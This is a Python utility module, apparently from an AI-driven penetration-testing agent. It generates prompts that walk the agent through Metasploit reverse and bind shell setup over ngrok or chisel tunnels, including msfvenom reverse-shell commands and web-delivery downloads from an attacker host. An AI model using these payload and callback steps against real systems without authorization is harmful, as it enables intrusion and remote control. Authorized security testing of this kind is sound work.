"""
RedAmon Agent Utility Functions

Utility functions for API and prompts that are not orchestrator-specific.
Orchestrator-specific helpers are in orchestrator_helpers/.
"""

import asyncio
import contextvars
import logging
import os
import re
import time
from collections import OrderedDict
from textwrap import dedent

import httpx

from project_settings import get_setting

logger = logging.getLogger(__name__)

#: The run's own sandbox (the tunnel lookups' default): the run scope's handle.
_RUN = object()
#: A per-user run that holds no sandbox: no tunnel is read anywhere.
_NO_SANDBOX = object()
#: Replaced by the tests with an httpx.MockTransport; None is httpx's own.
_async_transport = None
_TUNNEL_READ_S = 3.0
_TUNNEL_STATUS_MAX_BYTES = 64 * 1024
#: A prompt is built on the event loop every run shares, and a sandbox's root sets the
#: pace of its answers: building one never dials a sandbox. It reads the tunnel manager's
#: last answer per instance, (person, view, instance) -> (read at, status or None);
#: a missing or stale one is read again in the background, bounded.
_TUNNEL_STATUS_TTL_S = 30.0
_TUNNEL_STATUS_MAX = 1024
_tunnel_status: "OrderedDict[tuple, tuple]" = OrderedDict()
_tunnel_refreshes: dict = {}
_TUNNEL_HOST = re.compile(r"[A-Za-z0-9](?:[A-Za-z0-9-]{0,62})(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]{0,62}))*")
#: chisel forwards the handler port only (mcp/servers/tunnel_manager.py, R:4444).
_CHISEL_PORT, _CHISEL_SRV_PORT = 4444, 8080


def get_session_count() -> int:
    """Get total number of active sessions."""
    from orchestrator_helpers import get_checkpointer
    cp = get_checkpointer()
    if cp and hasattr(cp, 'storage'):
        return len(cp.storage)
    return 0


def _section(*paragraphs: str) -> list[str]:
    """Convert dedented text blocks into a flat list of lines with blank separators."""
    lines: list[str] = []
    for p in paragraphs:
        lines.extend(dedent(p).strip().splitlines())
        lines.append("")
    return lines


def get_session_config_prompt() -> str:
    """
    Generate a prompt section with pre-configured payload settings.

    Decision Logic (3-way):
        REVERSE: LHOST set AND LPORT set  → clear reverse intent
        BIND:    LHOST empty AND LPORT empty AND BIND_PORT set → clear bind intent
        ASK:     anything else (discordant or all empty) → agent must ask user

    When NGROK_TUNNEL_ENABLED is True, the agent queries the ngrok API to
    auto-discover the public tunnel URL, overriding LHOST and LPORT.

    When CHISEL_TUNNEL_ENABLED is True, LHOST is derived from
    CHISEL_SERVER_URL and ports are deterministic (4444 + 8080).

    Returns:
        Formatted string with Metasploit commands for the agent.
    """
    # Fetch settings: empty string / None = "not set"
    LHOST = get_setting('LHOST', '') or None
    LPORT = get_setting('LPORT')
    BIND_PORT_ON_TARGET = get_setting('BIND_PORT_ON_TARGET')
    PAYLOAD_USE_HTTPS = get_setting('PAYLOAD_USE_HTTPS', False)
    NGROK_TUNNEL_ENABLED = get_setting('NGROK_TUNNEL_ENABLED', False)
    CHISEL_TUNNEL_ENABLED = get_setting('CHISEL_TUNNEL_ENABLED', False)
    # Per-user mode: the run's own Kali sandbox (or _NO_SANDBOX before its first Kali
    # call), whose ports are not the shared container's; None in shared mode.
    sandbox = _tunnel_sandbox()

    # -------------------------------------------------------------------------
    # NGROK TUNNEL: auto-discover public URL if enabled
    # -------------------------------------------------------------------------
    ngrok_active = False
    ngrok_error = None
    if NGROK_TUNNEL_ENABLED:
        tunnel_info = _query_ngrok_tunnel()
        if tunnel_info:
            LHOST = tunnel_info['host']
            LPORT = tunnel_info['port']
            ngrok_active = True
        else:
            ngrok_error = ("ngrok tunnel enabled but API unreachable "
                           "— falling back to configured LHOST/LPORT")

    # -------------------------------------------------------------------------
    # CHISEL TUNNEL: derive endpoints from CHISEL_SERVER_URL
    # -------------------------------------------------------------------------
    chisel_active = False
    chisel_error = None
    chisel_srv_port = None
    if CHISEL_TUNNEL_ENABLED and not ngrok_active:
        tunnel_info = _query_chisel_tunnel()
        if tunnel_info:
            LHOST = tunnel_info['host']
            LPORT = tunnel_info['port']
            chisel_srv_port = tunnel_info.get('srv_port')
            chisel_active = True
        else:
            chisel_error = ("chisel tunnel enabled but CHISEL_SERVER_URL not set or invalid "
                            "— falling back to configured LHOST/LPORT")

    # -------------------------------------------------------------------------
    # 3-WAY DECISION: reverse / bind / ask user
    # -------------------------------------------------------------------------
    has_lhost = bool(LHOST)
    has_lport = LPORT is not None and LPORT > 0
    has_bind_port = BIND_PORT_ON_TARGET is not None and BIND_PORT_ON_TARGET > 0

    if has_lhost and has_lport:
        mode = "reverse"
    elif not has_lhost and not has_lport and has_bind_port:
        mode = "bind"
    else:
        mode = "ask"

    lines: list[str] = ["### Pre-Configured Payload Settings", ""]

    # -------------------------------------------------------------------------
    # TUNNEL STATUS BANNERS
    # -------------------------------------------------------------------------
    if NGROK_TUNNEL_ENABLED:
        if ngrok_active:
            lines += _section(f"""\
                **ngrok Tunnel: ACTIVE** — public endpoint `{LHOST}:{LPORT}`
                The Metasploit listener runs locally on kali-sandbox:4444.
                The target connects to the ngrok public URL, which tunnels traffic to your listener.

                **CRITICAL: You MUST use REVERSE payloads (reverse_tcp or reverse_https).
                NEVER use bind payloads — bind mode cannot work through an ngrok tunnel
                because ngrok only forwards inbound connections to the local listener.**""")
        elif ngrok_error:
            lines += _section(f"**ngrok Tunnel: ERROR** — {ngrok_error}")

    if CHISEL_TUNNEL_ENABLED:
        if chisel_active:
            lines += _section(f"""\
                **Chisel Tunnel: ACTIVE** — handler `{LHOST}:{LPORT}` + web delivery `{LHOST}:{chisel_srv_port}`
                The Metasploit listener runs locally on kali-sandbox:4444.
                Web delivery / HTA server runs on kali-sandbox:8080.
                The target connects to the VPS public IP, which tunnels traffic through chisel.

                **CRITICAL: You MUST use REVERSE payloads (reverse_tcp or reverse_https).
                NEVER use bind payloads — bind mode cannot work through a chisel tunnel
                because chisel only forwards inbound connections to the local listener.**""")
        elif chisel_error:
            lines += _section(f"**Chisel Tunnel: ERROR** — {chisel_error}")

    # -------------------------------------------------------------------------
    # SHOW CONFIGURED MODE
    # -------------------------------------------------------------------------
    if mode == "reverse":
        # Determine connection type based on PAYLOAD_USE_HTTPS
        if PAYLOAD_USE_HTTPS:
            conn_type = "reverse_https"
            reason = "PAYLOAD_USE_HTTPS=True (encrypted, evades firewalls)"
        else:
            conn_type = "reverse_tcp"
            reason = "PAYLOAD_USE_HTTPS=False (fastest, plain TCP)"

        lines += _section(f"""\
            **Mode: REVERSE** (target connects to you)

            ```
            ┌─────────────┐                    ┌─────────────┐
            │   TARGET    │ ───connects to───► │  ATTACKER   │
            │             │                    │ {LHOST}:{LPORT} │
            └─────────────┘                    └─────────────┘
            ```

            **Payload type:** `{conn_type}` ({reason})

            **IMPORTANT: You MUST first set TARGET to Dropper/Staged!**
            ```
            show targets
            set TARGET 0   # Choose 'Automatic (Dropper)' or similar
            ```

            **Then select a Meterpreter reverse payload from `show payloads`:**

            Look for payloads with `meterpreter/{conn_type}` in the name.
            Choose the appropriate payload based on target platform:
            - `cmd/unix/*/meterpreter/{conn_type}` for interpreted languages (PHP, Python, etc.)
            - `linux/*/meterpreter/{conn_type}` for Linux native binaries
            - `windows/*/meterpreter/{conn_type}` for Windows targets""")

        if ngrok_active:
            lines += _section(f"""\
                **IMPORTANT: ngrok tunnel is active — REVERSE payloads ONLY!**

                **⚠️ STAGELESS PAYLOADS REQUIRED WITH NGROK!**
                Staged payloads (`meterpreter/reverse_tcp` with `/`) FAIL through ngrok —
                the stage transfer gets corrupted by the tunnel proxy and the session dies instantly.
                You MUST use **stageless** payloads (`meterpreter_reverse_tcp` with `_` underscore):

                | BROKEN (staged `/`) | USE THIS (stageless `_`) |
                |---------------------|--------------------------|
                | `linux/x64/meterpreter/{conn_type}` | `linux/x64/meterpreter_{conn_type}` |
                | `windows/meterpreter/{conn_type}` | `windows/meterpreter_{conn_type}` |
                | `cmd/unix/python/meterpreter/{conn_type}` | `python/meterpreter_{conn_type}` |

                There are TWO different LHOST/LPORT values — do NOT confuse them:

                | Purpose | LHOST | LPORT |
                |---------|-------|-------|
                | **Metasploit handler** (inside msfconsole) | `{LHOST}` | `{LPORT}` |
                | **ReverseListenerBind** (where handler actually listens) | `127.0.0.1` | `4444` |
                | **Payload / shell one-liner** (what the target connects to) | `{LHOST}` | `{LPORT}` |

                ngrok forwards `{LHOST}:{LPORT}` → `127.0.0.1:4444` inside kali-sandbox.

                **Metasploit handler commands (inside msfconsole):**
                ```
                set PAYLOAD <chosen_STAGELESS_reverse_payload>
                set LHOST {LHOST}
                set LPORT {LPORT}
                set ReverseListenerBindAddress 127.0.0.1
                set ReverseListenerBindPort 4444
                set AutoVerifySession false
                set DisablePayloadHandler false
                ```

                **For msfvenom standalone payloads:**
                `msfvenom -p linux/x64/meterpreter_{conn_type} LHOST={LHOST} LPORT={LPORT} -f elf -o /tmp/shell.elf`

                **For shell one-liners (NO-MODULE FALLBACK only):**
                Use `LHOST={LHOST}` and `LPORT={LPORT}` (the ngrok public endpoint).
                The handler MUST use the same LHOST/LPORT + ReverseListenerBindAddress settings above.""")

        elif chisel_active:
            lines += _section(f"""\
                **IMPORTANT: chisel tunnel is active — REVERSE payloads ONLY!**

                **⚠️ STAGELESS PAYLOADS REQUIRED WITH CHISEL!**
                Staged payloads (`meterpreter/reverse_tcp` with `/`) FAIL through chisel —
                the stage transfer gets corrupted by the tunnel and the session dies instantly in a loop.
                You MUST use **stageless** payloads (`meterpreter_reverse_tcp` with `_` underscore):

                | BROKEN (staged `/`) | USE THIS (stageless `_`) |
                |---------------------|--------------------------|
                | `linux/x64/meterpreter/{conn_type}` | `linux/x64/meterpreter_{conn_type}` |
                | `windows/meterpreter/{conn_type}` | `windows/meterpreter_{conn_type}` |
                | `python/meterpreter/{conn_type}` | `python/meterpreter_{conn_type}` |

                There are TWO different LHOST/LPORT contexts — do NOT confuse them:

                | Purpose | LHOST | LPORT |
                |---------|-------|-------|
                | **Metasploit handler** (inside msfconsole) | `{LHOST}` | `{LPORT}` |
                | **ReverseListenerBind** (where handler actually listens) | `127.0.0.1` | `4444` |
                | **Payload / shell one-liner** (what the target connects to) | `{LHOST}` | `{LPORT}` |
                | **Web delivery / HTA SRVHOST** (Metasploit module setting) | `0.0.0.0` | `8080` |
                | **Web delivery / HTA URL** (what the target downloads from) | `{LHOST}` | `{chisel_srv_port}` |

                chisel forwards `{LHOST}:{LPORT}` -> `127.0.0.1:4444` and `{LHOST}:{chisel_srv_port}` -> `127.0.0.1:8080` inside kali-sandbox.

                **Metasploit handler commands (inside msfconsole):**
                ```
                set PAYLOAD <chosen_STAGELESS_reverse_payload>
                set LHOST {LHOST}
                set LPORT {LPORT}
                set ReverseListenerBindAddress 127.0.0.1
                set ReverseListenerBindPort 4444
                set AutoVerifySession false
                set DisablePayloadHandler false
                ```

                **For web delivery / HTA delivery (Method C & D):**
                ```
                set SRVHOST 0.0.0.0
                set SRVPORT 8080
                ```
                The victim downloads from `http://{LHOST}:{chisel_srv_port}/...` which chisel tunnels to kali-sandbox:8080.

                **For msfvenom standalone payloads (STAGELESS only):**
                `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o /tmp/shell.elf`

                **For shell one-liners (NO-MODULE FALLBACK only):**
                Use `LHOST={LHOST}` and `LPORT={LPORT}` (the VPS public endpoint).
                The handler MUST use the same LHOST/LPORT + ReverseListenerBindAddress settings above.""")

        else:
            lines += _section(f"""\
                **Metasploit commands:**
                ```
                set PAYLOAD <chosen_payload_from_show_payloads>
                set LHOST {LHOST}
                set LPORT {LPORT}
                ```""")
            if sandbox is not None:
                lines += _section(_per_user_reverse_note(sandbox, LPORT))

        lines += _section("After exploit succeeds, use `msf_wait_for_session()` to wait for session.")

    elif mode == "bind":
        lines += _section(f"""\
            **Mode: BIND** (you connect to target)

            ```
            ┌─────────────┐                    ┌─────────────┐
            │  ATTACKER   │ ───connects to───► │   TARGET    │
            │    (you)    │                    │ opens :{BIND_PORT_ON_TARGET} │
            └─────────────┘                    └─────────────┘
            ```

            **Then select a Meterpreter bind payload from `show payloads`:**

            Look for payloads with `meterpreter/bind_tcp` in the name.
            Choose the appropriate payload based on target platform:
            - `cmd/unix/*/meterpreter/bind_tcp` for interpreted languages (PHP, Python, etc.)
            - `linux/*/meterpreter/bind_tcp` for Linux native binaries
            - `windows/*/meterpreter/bind_tcp` for Windows targets

            **Metasploit commands:**
            ```
            set PAYLOAD <chosen_payload_from_show_payloads>
            set LPORT {BIND_PORT_ON_TARGET}
            ```

            **Note:** NO LHOST needed for bind payloads!
            After exploit succeeds, use `msf_wait_for_session()` to wait for connection.""")

    else:
        lines += _section(f"""\
            ⚠️ **PAYLOAD DIRECTION NOT CONFIGURED - ASK USER BEFORE EXPLOITING!**

            **Current settings:**
            - LHOST (Attacker IP): `{LHOST or 'empty'}`
            - LPORT (Attacker Port): `{LPORT or 'empty'}`
            - Bind Port on Target: `{BIND_PORT_ON_TARGET or 'empty'}`""")

        if NGROK_TUNNEL_ENABLED and ngrok_error:
            lines += _section("""\
                **Problem:** ngrok tunnel is enabled but the tunnel API is unreachable.
                The user intended to use a REVERSE payload through ngrok, but the tunnel is not running.
                Ask the user to check that the ngrok auth token is configured in Global Settings → Tunneling.""")
        elif CHISEL_TUNNEL_ENABLED and chisel_error:
            lines += _section("""\
                **Problem:** chisel tunnel is enabled but the chisel server URL is not set or invalid.
                The user intended to use a REVERSE payload through chisel, but the tunnel is not configured.
                Ask the user to check that the chisel server URL is configured in Global Settings → Tunneling.""")
        elif has_lhost and not has_lport:
            lines += _section("**Problem:** LHOST is set but LPORT is missing. For reverse payloads, both are required.")
        elif has_lport and not has_lhost:
            lines += _section("**Problem:** LPORT is set but LHOST is missing. For reverse payloads, both are required.")
        else:
            lines += _section("**Problem:** No payload direction is configured.")

        lines += _section("""\
            **Use `action: "ask_user"` to ask which payload mode to use:**

            1. **REVERSE** (target connects back to you):
               - Requires: LHOST (your IP) + LPORT (listening port)

            2. **BIND** (you connect to target):
               - Requires: Bind port on target (e.g. 4444)""")

        # The reverse-shell LHOST is the HOST's LAN IP, never the container's
        # 172.x address. redamon.sh detects it on the host and passes it in via
        # HOST_LAN_IP; suggest it here. Suppressed when a tunnel is configured —
        # in that case the ask-branch is a tunnel-is-broken state (an active
        # tunnel makes mode="reverse", not "ask"), and its remedy above is "fix
        # the tunnel", which a LAN-IP suggestion would contradict.
        host_lan_ip = os.getenv("HOST_LAN_IP", "").strip()
        tunnel_configured = NGROK_TUNNEL_ENABLED or CHISEL_TUNNEL_ENABLED
        if sandbox is not None:
            lines += _section(_per_user_lhost_hint(sandbox, host_lan_ip, tunnel_configured))
        else:
            if host_lan_ip and not tunnel_configured:
                suggest = (
                    f"The host's detected LAN IP (default route) is `{host_lan_ip}` "
                    "— suggest this as LHOST and confirm with the user. If they are "
                    "on a VPN to reach the target, the VPN interface's IP is the "
                    "right one instead."
                )
            else:
                suggest = "ASK THE USER for it, do not run a command to find it."
            lines += _section(f"""\
                **⚠️ WHICH IP IS LHOST — DO NOT GUESS OR AUTO-DETECT IT.**
                Your tools run inside the kali-sandbox container, whose own address
                is a private `172.x` Docker IP that the target CANNOT reach. Reading
                it (`ip addr` / `ifconfig` / `hostname -I`) gives the WRONG LHOST.
                The correct LHOST is the **host machine's LAN IP** (e.g. your Kali
                VM's `192.168.x.x`); the reverse handler's port 4444 is forwarded
                from the host into the container, so the target connects to
                `host-LAN-IP:LPORT`. You cannot discover the host's LAN IP from
                inside the container — {suggest}""")

    lines += _section("Replace `<os>/<arch>` with target OS (e.g., `linux/x64`, `windows/x64`).")

    return "\n".join(lines)


def _published_reverse_port(sandbox) -> int | None:
    """The pool port the sandbox publishes on the host for reverse shells, or None (no
    pool: the sandbox publishes nothing, or no sandbox is known yet)."""
    import sandbox_contract

    port = getattr(sandbox, "reverse_port", None)
    if sandbox is _NO_SANDBOX or not isinstance(port, int) or port == sandbox_contract.DEFAULT_REVERSE_PORT:
        return None
    return port


def _per_user_lhost_hint(sandbox, host_lan_ip: str, tunnel_configured: bool) -> str:
    """The LHOST paragraph for a per-user sandbox: its own pool port when it has one,
    else no direct reverse shell at all (nothing of it is published on the host)."""
    pool = _published_reverse_port(sandbox)
    if pool is None:
        return dedent("""\
            **⚠️ NO DIRECT REVERSE SHELL — YOUR KALI SANDBOX PUBLISHES NO PORT.**
            Your tools run inside your own Kali sandbox, on a private Docker network
            the target CANNOT reach, and no port of it is published on the host: a
            reverse payload's connection can reach it only through a tunnel. Ask the
            user to turn on a tunnel (Settings → Tunneling: ngrok or chisel), or use
            a BIND payload. Do not suggest the host's LAN IP as LHOST.""")
    if host_lan_ip and not tunnel_configured:
        suggest = (f"The host's detected LAN IP (default route) is `{host_lan_ip}` — suggest "
                   "it as LHOST and confirm with the user.")
    else:
        suggest = "ASK THE USER for it, do not run a command to find it."
    return dedent(f"""\
        **⚠️ WHICH IP IS LHOST — DO NOT GUESS OR AUTO-DETECT IT.**
        Your tools run inside your own Kali sandbox, whose address is a private
        Docker IP the target CANNOT reach. Its reverse-shell port `{pool}` is
        published on the host: use LPORT `{pool}` (the handler listens on `{pool}`
        inside the sandbox), and as LHOST the host's address the target can reach.
        The port answers from outside only if the operator published the pool on
        that address (`KALI_SANDBOX_PORT_POOL` with a bind address). {suggest}""")


def _per_user_reverse_note(sandbox, lport) -> str:
    """A configured LHOST/LPORT without a tunnel, in a per-user sandbox."""
    pool = _published_reverse_port(sandbox)
    if pool is None:
        return ("**Note:** your Kali sandbox publishes no port on the host, so a reverse "
                f"connection to LPORT {lport} reaches it only through a tunnel (Settings → "
                "Tunneling). Without one, use a BIND payload.")
    return (f"**Note:** your Kali sandbox's published reverse-shell port is `{pool}`: set "
            f"LPORT `{pool}` (not {lport}) so the target's connection reaches the handler.")


def _tunnel_sandbox(handle=_RUN):
    """Whose tunnels the lookups read: None in shared mode (today's instance tunnel), the
    per-user handle (the run's own by default), or _NO_SANDBOX for a per-user run that
    holds no sandbox yet, which reads nothing: never the shared container's tunnel nor
    another person's."""
    import sandbox_contract
    import sandbox_router

    if handle is _RUN:
        handle = sandbox_router.current_handle()
    if handle is not None and handle.mode == sandbox_contract.MODE_PER_USER:
        return handle
    if handle is None and sandbox_router.current_mode() == sandbox_contract.MODE_PER_USER:
        return _NO_SANDBOX
    return None


def tunnels_from_status(data) -> tuple:
    """(ngrok, chisel) from a sandbox tunnel manager's `/tunnel/status`: each the public
    endpoint of an active tunnel, or None. The sandbox's root writes this answer, so a
    host or port outside its shape reads as no tunnel."""
    def entry(name):
        value = data.get(name) if isinstance(data, dict) else None
        if not isinstance(value, dict) or value.get("active") is not True:
            return None
        host = value.get("host")
        if not isinstance(host, str) or len(host) > 253 or not _TUNNEL_HOST.fullmatch(host):
            return None
        return value

    ngrok, chisel = entry("ngrok"), entry("chisel")
    ngrok_port = ngrok.get("port") if ngrok else None
    if not (isinstance(ngrok_port, int) and not isinstance(ngrok_port, bool) and 1 <= ngrok_port <= 65535):
        ngrok = None
    return (
        {"host": ngrok["host"], "port": ngrok_port, "hostname": ngrok["host"]} if ngrok else None,
        {"host": chisel["host"], "port": _CHISEL_PORT, "srv_port": _CHISEL_SRV_PORT,
         "hostname": chisel["host"]} if chisel else None,
    )


def _tunnel_status_request(handle) -> tuple:
    """(url, headers) of an instance's tunnel status: its tunnel manager on 8015, with its
    tunnel token, else its MCP token (which the tunnel manager takes for this read)."""
    import sandbox_router

    headers = sandbox_router.headers_for(handle, "tunnel") or sandbox_router.headers_for(handle)
    return sandbox_router.url_for(handle, "tunnel", "/tunnel/status"), headers


async def _read_tunnel_status(key: tuple, url: str, headers: dict) -> dict | None:
    from sandbox_http import read_answer

    try:
        async with httpx.AsyncClient(timeout=_TUNNEL_READ_S, transport=_async_transport) as client:
            answer = await read_answer(client, "GET", url, headers=headers,
                                       max_bytes=_TUNNEL_STATUS_MAX_BYTES, deadline_s=_TUNNEL_READ_S)
        data = answer.json() if answer.status == 200 else None
    except Exception as e:  # noqa: BLE001 - no tunnel is the normal state
        logger.debug(f"sandbox tunnel status not read: {type(e).__name__}")
        data = None
    _tunnel_status[key] = (time.monotonic(), data if isinstance(data, dict) else None)
    _tunnel_status.move_to_end(key)
    while len(_tunnel_status) > _TUNNEL_STATUS_MAX:
        _tunnel_status.popitem(last=False)
    return _tunnel_status[key][1]


async def refresh_tunnel_status(handle) -> dict | None:
    """Read an instance's tunnel status now (bounded, through sandbox_http.read_answer),
    remember it for the prompts, and return it; None when it did not answer."""
    url, headers = _tunnel_status_request(handle)
    return await _read_tunnel_status(handle.key, url, headers)


def forget_tunnel_status(keys) -> None:
    """A push changed these instances' tunnels: the next prompt reads them again."""
    for key in keys:
        _tunnel_status.pop(key, None)


def _cached_tunnel_status(handle) -> dict | None:
    """The instance's last tunnel status, without any I/O. A missing or stale one is read
    again in a background task on the running loop (one per instance at a time)."""
    entry = _tunnel_status.get(handle.key)
    if entry is None or time.monotonic() - entry[0] > _TUNNEL_STATUS_TTL_S:
        _schedule_tunnel_refresh(handle)
    return entry[1] if entry else None


def _schedule_tunnel_refresh(handle) -> None:
    key = handle.key
    if key in _tunnel_refreshes:
        return
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        return
    url, headers = _tunnel_status_request(handle)
    # Its own context: the run's (its scope, its handle) never rides along.
    task = loop.create_task(_read_tunnel_status(key, url, headers), context=contextvars.Context())
    _tunnel_refreshes[key] = task
    task.add_done_callback(lambda _t, key=key: _tunnel_refreshes.pop(key, None))


async def _settle_tunnel_refreshes() -> None:
    """Tests: wait for the background reads in flight."""
    tasks = [t for t in list(_tunnel_refreshes.values()) if not t.done()]
    if tasks:
        await asyncio.wait(tasks)


def _forget_all_tunnel_status() -> None:
    """Tests: forget every remembered status."""
    _tunnel_status.clear()


def _query_ngrok_tunnel(handle=_RUN) -> dict | None:
    """
    Query the ngrok API to get the public TCP tunnel URL.

    Shared mode: ngrok runs inside kali-sandbox and exposes its API at
    http://kali-sandbox:4040/api/tunnels within the Docker network. Per-user mode:
    the run's own sandbox (or `handle`), as its tunnel manager on 8015 last answered
    (ngrok's API listens on the sandbox's loopback only), never dialled from here: a
    stale answer is read again in the background. Only the `own` view has a tunnel.

    The hostname is returned as-is (not pre-resolved) because the agent
    container's DNS may resolve ngrok TCP relay hostnames to a different
    IP than the actual relay server.  The target will resolve the hostname
    through its own DNS, which returns the correct IP.

    Returns:
        Dict with 'host' (str — ngrok hostname), 'port' (int), and
        'hostname' (str — same as host) if a TCP tunnel is found,
        or None if ngrok is unreachable or no tunnel exists.
    """
    import requests

    import sandbox_contract

    target = _tunnel_sandbox(handle)
    if target is _NO_SANDBOX:
        return None
    if target is not None:
        if target.view != sandbox_contract.VIEW_OWN:
            return None
        return tunnels_from_status(_cached_tunnel_status(target))[0]

    try:
        resp = requests.get("http://kali-sandbox:4040/api/tunnels", timeout=5)
        resp.raise_for_status()
        data = resp.json()

        for tunnel in data.get("tunnels", []):
            if tunnel.get("proto") == "tcp":
                public_url = tunnel["public_url"]  # e.g. "tcp://0.tcp.ngrok.io:12345"
                addr = public_url.replace("tcp://", "")
                hostname, port_str = addr.rsplit(":", 1)
                port = int(port_str)

                logger.info(f"ngrok TCP tunnel: {hostname}:{port}")
                return {
                    "host": hostname,
                    "port": port,
                    "hostname": hostname,
                }

        logger.debug("ngrok API returned no TCP tunnels")
        return None

    except Exception as e:
        # Not an error: a missing/unreachable tunnel is the normal state when
        # ngrok is not configured. At WARNING this floods the log on every poll.
        logger.debug(f"ngrok tunnel API unreachable: {e}")
        return None


def _query_chisel_tunnel(handle=_RUN) -> dict | None:
    """
    Derive public tunnel endpoints from the chisel server URL stored in the database.

    Unlike ngrok (which requires an API query to discover random ports),
    chisel tunnels are deterministic: the VPS hostname from the chisel server URL
    is the public endpoint, and the forwarded ports are always 4444 (handler)
    and 8080 (web delivery / HTA server).

    Returns:
        Dict with 'host' (str), 'port' (int = 4444), 'srv_port' (int = 8080),
        and 'hostname' (str) if chisel is configured,
        or None if not configured.
    """
    import os
    import requests as _requests
    from urllib.parse import urlparse

    import sandbox_contract
    import sandbox_router

    target = _tunnel_sandbox(handle)
    if target is _NO_SANDBOX or (target is not None and target.view != sandbox_contract.VIEW_OWN):
        return None
    # The person whose tunnel it is: in per-user mode the webapp answers only that
    # person's own config, while their tunnel is on.
    person = target.user_id if target is not None else sandbox_router.sandbox_user()

    # Fetch chisel URL from webapp (stored in UserSettings via Global Settings UI)
    webapp_url = os.environ.get("WEBAPP_API_URL", "http://webapp:3000")
    try:
        resp = _requests.get(
            f"{webapp_url}/api/global/tunnel-config",
            headers={"X-Internal-Key": os.environ.get("INTERNAL_API_KEY", "")},
            params={"userId": person} if person else None,
            timeout=5,
        )
        resp.raise_for_status()
        chisel_url = resp.json().get("chiselServerUrl", "")
    except Exception as e:
        # The class only: the message can carry the URL, whose query names the person.
        logger.warning(f"Failed to fetch chisel config from webapp: {type(e).__name__}")
        chisel_url = ""

    if not chisel_url:
        return None

    try:
        parsed = urlparse(chisel_url)
        hostname = parsed.hostname
        if not hostname:
            logger.warning(f"Cannot parse hostname from CHISEL_SERVER_URL: {chisel_url}")
            return None

        logger.debug(f"chisel tunnel: {hostname}:4444 (handler) + {hostname}:8080 (web delivery)")
        return {
            "host": hostname,
            "port": 4444,
            "srv_port": 8080,
            "hostname": hostname,
        }
    except Exception as e:
        logger.warning(f"Failed to parse CHISEL_SERVER_URL: {e}")
        return None
